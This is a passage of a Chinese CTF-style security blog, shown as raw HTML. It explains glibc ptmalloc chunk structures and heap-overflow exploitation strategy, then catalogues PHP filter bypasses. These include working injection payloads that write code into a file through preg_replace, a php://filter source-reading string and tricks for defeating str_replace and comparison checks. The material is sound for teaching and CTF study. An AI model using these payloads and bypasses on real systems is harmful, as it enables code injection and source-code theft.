   [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>第一个线程 malloc 后， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为 mmap 函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 thread arena。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<p>在第一个线程释放内存后， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">After free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure>

<h2 id="heap的相关结构"><a href="#heap的相关结构" class="headerlink" title="heap的相关结构"></a>heap的相关结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。<br>非常有意思的是，无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。<br>malloc_chunk 的结构如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="line">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="line">  fields at known offsets from a given base. See explanation below.</span><br><span class="line">*/</span><br><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>首先，这里给出一些必要的解释 INTERNAL_SIZE_T，SIZE_SZ,MALLOC_ALIGN_MASK：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span><br><span class="line">   chunk sizes.</span><br><span class="line">   The default version is the same as size_t.</span><br><span class="line">   While not strictly necessary, it is best to define this as an</span><br><span class="line">   unsigned type, even if size_t is a signed type. This may avoid some</span><br><span class="line">   artificial size limitations on some systems.</span><br><span class="line">   On a 64-bit machine, you may be able to reduce malloc overhead by</span><br><span class="line">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&apos; at the</span><br><span class="line">   expense of not being able to handle more than 2^32 of malloced</span><br><span class="line">   space. If this limitation is acceptable, you are encouraged to set</span><br><span class="line">   this unless you are on a platform requiring 16byte alignments. In</span><br><span class="line">   this case the alignment requirements turn out to negate any</span><br><span class="line">   potential advantages of decreasing size_t word size.</span><br><span class="line">   Implementors: Beware of the possible combinations of:</span><br><span class="line">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span><br><span class="line">       and might be the same width as int or as long</span><br><span class="line">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span><br><span class="line">     - int and long might be 32 or 64 bits, and might be the same width</span><br><span class="line">   To deal with this, most comparisons and difference computations</span><br><span class="line">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span><br><span class="line">   aware of the fact that casting an unsigned int to a wider long does</span><br><span class="line">   not sign-extend. (This also makes checking for negative numbers</span><br><span class="line">   awkward.) Some of these casts result in harmless compiler warnings</span><br><span class="line">   on some systems.  */</span><br><span class="line">#ifndef INTERNAL_SIZE_T</span><br><span class="line"># define INTERNAL_SIZE_T size_t</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/* The corresponding word size.  */</span><br><span class="line">#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span><br><span class="line"></span><br><span class="line">/* The corresponding bit mask value.  */</span><br><span class="line">#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br></pre></td></tr></table></figure>

<p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。<br>每个字段的具体的解释如下:</p>
<ul>
<li>prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。<br>size ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</li>
<li><ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
</ul>
</li>
<li><ul>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
</ul>
</li>
<li><ul>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
<li>fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下:</li>
<li><ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
</ul>
</li>
<li><ul>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
</ul>
</li>
<li><ul>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</li>
<li><ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
</ul>
</li>
<li><ul>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
</ul>
</li>
<li><ul>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。<br>一个已经分配的 chunk 的样子如下。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</li>
</ul>
</li>
</ul>
<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p>
<ul>
<li><p>本身的 size 字段会记录，</p>
</li>
<li><p>它后面的 chunk 会记录。</p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p>
</li>
</ul>
<p>不难发现，堆溢出漏洞发生的基本前提是:</p>
<ul>
<li>程序向堆上写入数据。</li>
<li>写入的数据大小没有被良好地控制。<br>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等)。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</li>
<li>覆盖与其物理相邻的下一个 chunk 的内容。</li>
<li><ul>
<li>prev_size</li>
</ul>
</li>
<li><ul>
<li>size，主要有三个比特位，以及该堆块真正的大小。</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>NON_MAIN_ARENA</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>IS_MAPPED</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>PREV_INUSE</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>the True chunk size</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li>chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。<h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3>堆溢出中比较重要的几个步骤:<h4 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h4>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">//等同于</span><br><span class="line">ptr=malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk,*chunk1;</span><br><span class="line">  chunk=malloc(16);</span><br><span class="line">  chunk1=realloc(chunk,32);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>realloc 的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作:</p>
<ul>
<li>当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</li>
<li><ul>
<li>如果申请 size &gt; 原来 size</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li>如果申请 size &lt; 原来 size</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li>
</ul>
</li>
</ul>
</li>
<li><ul>
<li><ul>
<li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li>
<li>当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作<h4 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h4>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</li>
</ul>
<p>常见的危险函数如下</p>
<ul>
<li>输入</li>
<li><ul>
<li>gets，直接读取一行，忽略 ‘\x00’</li>
</ul>
</li>
<li><ul>
<li>scanf</li>
</ul>
</li>
<li><ul>
<li>vscanf</li>
</ul>
</li>
<li>输出</li>
<li><ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串</li>
<li><ul>
<li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li>
</ul>
</li>
<li><ul>
<li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li>
</ul>
</li>
<li><ul>
<li>bcopy<h4 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h4>这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为 16 字节的块。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk=malloc(0);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">//根据系统的位数，malloc会分配8或16字节的用户空间</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size = 用户区域大小 + 2 * 字长<br>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。回头再来看下之前的示例代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk;</span><br><span class="line">  chunk=malloc(24);</span><br><span class="line">  puts(&quot;Get input:&quot;);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察如上代码，我们申请的 chunk 大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1</span><br></pre></td></tr></table></figure>

<p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 pre_size 域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/* pad request bytes into a usable size -- internal version */</span><br><span class="line">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="line">#define request2size(req)                                                      \</span><br><span class="line">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="line">         ? MINSIZE                                                             \</span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure>

<p>当 req=24 时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的。</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计</title>
    <url>/2019/12/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="php函数绕过小结"><a href="#php函数绕过小结" class="headerlink" title="php函数绕过小结"></a>php函数绕过小结</h1><a id="more"></a>
<h2 id="0-preg-replace"><a href="#0-preg-replace" class="headerlink" title="0.preg_replace()"></a>0.preg_replace()</h2><p>该函数使用正则表达式来进行匹配特定的字符串.</p>
<ul>
<li>问题代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = addslashes($_GET[&apos;option&apos;]);</span><br><span class="line">$file = file_get_contents(&apos;xxxxx/option.php&apos;);</span><br><span class="line">$file = preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$str&apos;;&quot;,$file);</span><br><span class="line">file_put_contents(&apos;xxxxx/option.php&apos;,$file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>输入经过addslashes()处理过之后经匹配替换指定文件内容。</p>
<ul>
<li>解法1 利用反斜线</li>
</ul>
<p>输入<code>\&#39;;phpinfo();//</code><br>经过addslashes()之后变为\&#39;，随后preg_replace会将两个连续的\合并为一个，也就是将\&#39;转为\‘，这样我们就成功引入了一个单引号，闭合上文注释下文，中间加入要执行的代码即可.</p>
<ul>
<li>解法2 利用正则<br>过程分为两个请求：</li>
</ul>
<p>第一次传入 aaa’;phpinfo();%0a//</p>
<p>此时文件内容</p>
<p>$option=’aaa&#39;;phpinfo();<br>//‘;<br>第二次传入随意字串，如bbb 正则代码.*会将匹配到的aaa\替换为bbb</p>
<p>此时文件内容(成功写入恶意代码)</p>
<p>$option=’bbb’;phpinfo();<br>//‘;</p>
<ul>
<li>解法3 利用%00<br>仍然分为两步。</li>
</ul>
<p>第一次传入;phpinfo(); 此时文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$option=&apos;;phpinfo();&apos;;</span><br></pre></td></tr></table></figure>

<p>第二次传入%00</p>
<p>%00被addslashes()转为\0，而\0在preg_replace函数中会被替换为“匹配到的全部内容”，此时preg_replace要执行的代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;\0&apos;;&quot;,$file);</span><br></pre></td></tr></table></figure>

<p>也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$option=&apos;;phpinfo();&apos;;&apos;;&quot;,$file);</span><br></pre></td></tr></table></figure>

<p>成功引入单引号闭合，最终写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$option=&apos;\$option=&apos;;phpinfo();&apos;;&apos;;</span><br></pre></td></tr></table></figure>

<h2 id="1-MD5"><a href="#1-MD5" class="headerlink" title="1.MD5()"></a>1.MD5()</h2><p>我们都知道，MD5 加密(sha1())是对字符串进行加密，那么如果我们传入的不是字符串，而是一个数组呢？？？ 它没法进行加密，返回空，结果不就相等了吗.(大部分的php函数,如strcmp()无法处理数组,返回值基本是NULL).</p>
<h2 id="2-str-replace"><a href="#2-str-replace" class="headerlink" title="2.str_replace()"></a>2.str_replace()</h2><p>str_replace()函数用于过滤多余字符的,基本可以通过双写目标字符来解决,例如../可以用….//或者…/./来解决,key可以用kkeyey来解决.</p>
<h2 id="3-parse-url"><a href="#3-parse-url" class="headerlink" title="3.parse_url()"></a>3.parse_url()</h2><p>本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。<br>对于高版本的php的来说 直接/// 三个斜杠就可以直接解决.</p>
<h2 id="4-intval"><a href="#4-intval" class="headerlink" title="4.intval()"></a>4.intval()</h2><p>intval()转换的时候，会将从字符串的开始进行转换知道遇到一个非数字的字符。<br>即使出现无法转换的字符串，intval()不会报错而是返回0。<br>注：<br>在科学计数法字符串转换为数字时，如果 E 后面的数小于某个值会弄成 double 类型，再强制转换为 int 类型时可能会有奇妙的结果，测试发现某变量为 1e-1000 时已经可以触发这个漏洞绕过两个检查，使得某变量既大于 0 又不大于 0。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump((int)(&apos;1e-1000&apos;)&gt;0);</span><br><span class="line">var_dump(&apos;1e-1000&apos;&gt;0);</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Command line code:1:</span><br><span class="line">bool(true)</span><br><span class="line">Command line code:1:</span><br><span class="line">bool(false)</span><br></pre></td></tr></table></figure>

<p>再如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump((int)(&apos;1e-10&apos;)&gt;0);</span><br><span class="line">var_dump(&apos;1e-10&apos;&gt;0);</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Command line code:1:</span><br><span class="line">bool(true)</span><br><span class="line">Command line code:1:</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>

<h2 id="5-array-search"><a href="#5-array-search" class="headerlink" title="5.array_search()"></a>5.array_search()</h2><p>用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比.<br>当检索中带入字符串，比如”sky”，会intval(‘sky’)==0，从而致使数字数组也可以查询成功.</p>
<h2 id="6-switch"><a href="#6-switch" class="headerlink" title="6.switch"></a>6.switch</h2><p>没有break的话不用判断真假即进入下一个case.</p>
<h2 id="7-php-filter协议"><a href="#7-php-filter协议" class="headerlink" title="7.php://filter协议"></a>7.php://filter协议</h2><p>php://filter 这个协议可以用来读取网页base64编码后的源代码。用这句 file=php://filter/read=convert.base64-encode/resource=xxxx.php.</p>
<h2 id="8-附-BUgku平台一道代码审计题"><a href="#8-附-BUgku平台一道代码审计题" class="headerlink" title="8.附:BUgku平台一道代码审计题"></a>8.附:BUgku平台一道代码审计题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;php?</span><br><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">id=_GET[&apos;id&apos;];</span><br><span class="line">a=_GET[&apos;a&apos;];</span><br><span class="line">b=_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;no no no no no no no&apos;;</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line">data=@filegetcontents(a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and id==0andstrlen(b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> 变量 $id 若想满足非空非零且弱等于整型数 0，则 $id 的值只能为非空非零字符串，这里假设 $id = “asd”.</p>
